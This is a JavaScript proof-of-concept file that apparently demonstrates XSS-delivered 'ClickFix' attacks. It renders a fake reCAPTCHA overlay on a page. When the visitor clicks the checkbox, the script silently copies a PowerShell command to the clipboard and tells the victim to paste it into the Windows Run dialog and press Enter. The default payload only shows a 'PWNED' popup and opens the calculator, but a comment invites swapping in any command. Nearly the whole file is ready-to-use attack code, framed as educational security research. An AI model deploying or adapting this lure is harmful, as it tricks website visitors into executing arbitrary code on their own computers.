/**
 * ======================================================================
 * SECURITY PROOF-OF-CONCEPT (PoC)
 * ======================================================================
 *
 * @file        [ClickFixPoC.js]
 * @author      [Abdul Rehman]
 * @contact     [hello@arkb.me]
 * @date        2025-11-15
 *
 * @purpose
 * This script is a proof-of-concept intended strictly for
 * educational and authorized security demonstration purposes. It
 * demonstrates XSS can be used as a delivery mechanism for
 * ClickFix campaigns. 
 * 
 * @credits
 * The UI layout and styling for this demonstration are based on
 * the work of planetyuyu.
 * @see https://codepen.io/planetyuyu/pen/ExBjOdY
 *
 * @disclaimer
 * This code is provided "as-is" for educational use only.
 * The author(s) and affiliated organizations assume no liability
 * for any misuse or damage caused by this code.
 *
 * Unauthorized use of this code against any system without
 * explicit permission is illegal and strictly prohibited.
 *
 * ======================================================================
 */

// Change this to whatever you want the user to have in their clipboard. 
const PAYLOAD = `powershell -Command "(New-Object -ComObject WScript.Shell).Popup('PWNED!!!', 0, 'PWNED!!!', 0)";calc`;
// DEFAULT PAYLOAD: Alerts "PWNED" and open calculator.


// Wait for the document to be fully loaded before running the script.
document.addEventListener('DOMContentLoaded', () => {

    // Wait additional 2 seconds before showing the captcha, so targets can see that they are on the actual website. 
    setTimeout(() => {

        // --- STYLES ---
        const style = document.createElement('style');
        
        style.textContent = `
            .captcha-overlay {
                position: fixed; 
                top: 0;
                left: 0;
                width: 100%;     
                height: 100%;    
                z-index: 1000;   
                backdrop-filter: blur(4px);
                background-color: rgba(0, 0, 0, 0.1); 
                display: grid;
                place-items: center;
                /* Use Roboto font for all children */
                font-family: 'Roboto', sans-serif;
            }

            .robot {    
                font-size: 14px;
                margin: 0;
            }

            .box-container {
                display: grid;
                grid-template-columns: auto 1fr auto;
                gap: 14px; 
                background-color: #F9F9F9;
                border: 1px solid #D3D3D3;
                border-radius: 3px;
                width: 300px;
                align-items: center;
                padding: 10px;
                box-shadow: 0 1px 3px rgba(0,0,0,0.1);
            }

            input[type="checkbox"] {
                appearance: none;    
                width: 26px;
                height: 26px;    
                border: 2px solid #C1C1C1;
                border-radius: 2px;
                margin: 0; /* Reset margin */
                cursor: pointer;
            }

            input[type="checkbox"]:checked::before {
                content: url(https://img.icons8.com/?size=20&id=27&format=png&color=1e5180);
                display: block;    
                line-height: 20px;
                padding: 1px 0px 0px 1px;
            }

            .logo {    
                display: block;
            }

            .logo-text {
                text-align: right;
                font-size: 9px;
            }

            .logo-text-tos {
                display: block;
                text-align: right;
                font-size: 9px;
            }

            .container {
                text-align: center;
                line-height: 0.1rem;
            }

            .captcha-challenge-modal {
                display: none;
                width: 400px;
                background: #fff;
                border-radius: 3px;
                border: 1px solid #D3D3D3;
                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
                user-select: none;
            }
            
            .challenge-header {
                background: #1e5180;
                color: white;
                padding: 16px 20px;
                font-size: 16px;
                border-radius: 3px 3px 0 0;
            }

            .challenge-content {
                padding: 20px;
                font-size: 16px;
                font-weight: 500;
                color: #333;
                min-height: 100px;
                display: grid;
            }

            .challenge-footer {
                padding: 10px 20px;
                text-align: right;
                border-top: 1px solid #eee;
            }

            .challenge-button {
                background: #1e5180;
                color: white;
                border: none;
                padding: 10px 24px;
                font-size: 14px;
                font-weight: 500;
                text-transform: uppercase;
                cursor: not-allowed;
                border-radius: 3px;
            }
        `;
        
        document.head.appendChild(style);

        const fontLink = document.createElement('link');
        fontLink.href = 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap';
        fontLink.rel = 'stylesheet';
        document.head.appendChild(fontLink);


        // --- HTML ELEMENTS ---
        const overlay = document.createElement('div');
        overlay.className = 'captcha-overlay';

        const boxContainer = document.createElement('div');
        boxContainer.className = 'box-container';

        const checkbox = document.createElement('input');
        checkbox.type = 'checkbox';

        const robotText = document.createElement('p');
        robotText.className = 'robot';
        robotText.textContent = "I'm not a robot";
        
        const logoOuterContainer = document.createElement('div');
        const logoInnerContainer = document.createElement('div');
        logoInnerContainer.className = 'container';

        const logo = document.createElement('div');
        logo.className = 'logo';
        logo.innerHTML = `
            <svg width="31" height="30" viewBox="0 0 31 30" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M30.0906 14.9789C30.0899 14.7631 30.0849 14.5485 30.0753 14.335V2.15984L26.7093 5.52576C23.9545 2.15375 19.7637 0 15.0697 0C10.1847 0 5.84492 2.33169 3.10156 5.94269L8.61873 11.5179C9.15941 10.5179 9.92751 9.65906 10.8536 9.01039C11.8168 8.25873 13.1816 7.64415 15.0695 7.64415C15.2976 7.64415 15.4736 7.6708 15.603 7.72101C17.9421 7.90563 19.9696 9.19653 21.1635 11.0702L17.2581 14.9755C22.2047 14.9561 27.7928 14.9447 30.0902 14.978" fill="#1C3AA9"/>
                <path d="M14.9789 0.000610352C14.7631 0.00131601 14.5485 0.00633868 14.335 0.0159818H2.15983L5.52576 3.38191C2.15375 6.13673 0 10.3275 0 15.0216C0 19.9065 2.33173 24.2463 5.94269 26.9897L11.5179 21.4725C10.5179 20.9318 9.65906 20.1637 9.01039 19.2376C8.25877 18.2744 7.64415 16.9096 7.64415 15.0217C7.64415 14.7937 7.6708 14.6176 7.72101 14.4883C7.90563 12.1492 9.19653 10.1216 11.0702 8.92779L14.9755 12.8331C14.9561 7.88654 14.9447 2.29845 14.978 0.00103747" fill="#4285F4"/>
                <path d="M0 15.0211C0.00072284 15.2369 0.00569389 15.4514 0.0153656 15.665V27.8402L3.38129 24.4742C6.13611 27.8462 10.3269 30 15.021 30C19.9059 30 24.2457 27.6683 26.9891 24.0573L21.4719 18.4821C20.9312 19.4821 20.1631 20.3409 19.237 20.9896C18.2738 21.7413 16.909 22.3558 15.0211 22.3558C14.7931 22.3558 14.617 22.3292 14.4877 22.279C12.1486 22.0944 10.121 20.8035 8.92718 18.9298L12.8325 15.0245C7.88593 15.0439 2.29784 15.0553 0.000429605 15.022" fill="#ABABAB"/>
            </svg>
            <div class="logo-text">
                <p>reCAPTCHA</p>            
            </div>
        `;

        const tosText = document.createElement('p');
        tosText.className = 'logo-text-tos';
        tosText.textContent = 'Privacy - Terms';
        
        const challengeModal = document.createElement('div');
        challengeModal.className = 'captcha-challenge-modal';
        
        const challengeHeader = document.createElement('div');
        challengeHeader.className = 'challenge-header';
        challengeHeader.textContent = 'Please verify you are human';
        
        const challengeContent = document.createElement('div');
        challengeContent.className = 'challenge-content';
        challengeContent.innerHTML = `
        <p>  1. Press and hold windows key <b><font face=Wingdings>&#xff;</font> + R</b>.</p>
        <p>  2. In the verification window, <b>press CTRL + V</b>.</p>
        <p>  3. Press <b>Enter</b> in your keyboard to finish.</p>

        `;
        
        const challengeFooter = document.createElement('div');
        challengeFooter.className = 'challenge-footer';
        
        const challengeButton = document.createElement('button');
        challengeButton.className = 'challenge-button';
        challengeButton.textContent = 'Verify';
        
        logoInnerContainer.appendChild(logo);
        logoInnerContainer.appendChild(tosText);
        logoOuterContainer.appendChild(logoInnerContainer);

        boxContainer.appendChild(checkbox);
        boxContainer.appendChild(robotText);
        boxContainer.appendChild(logoOuterContainer);

        challengeFooter.appendChild(challengeButton);
        challengeModal.appendChild(challengeHeader);
        challengeModal.appendChild(challengeContent);
        challengeModal.appendChild(challengeFooter);

        overlay.appendChild(boxContainer);
        overlay.appendChild(challengeModal);

        document.body.appendChild(overlay);
        
        // When checkbox is clicked
        checkbox.addEventListener('click', () => {
            navigator.clipboard.writeText(PAYLOAD);
            boxContainer.style.display = 'none';
            challengeModal.style.display = 'block';
            });
    }, 2000); 
});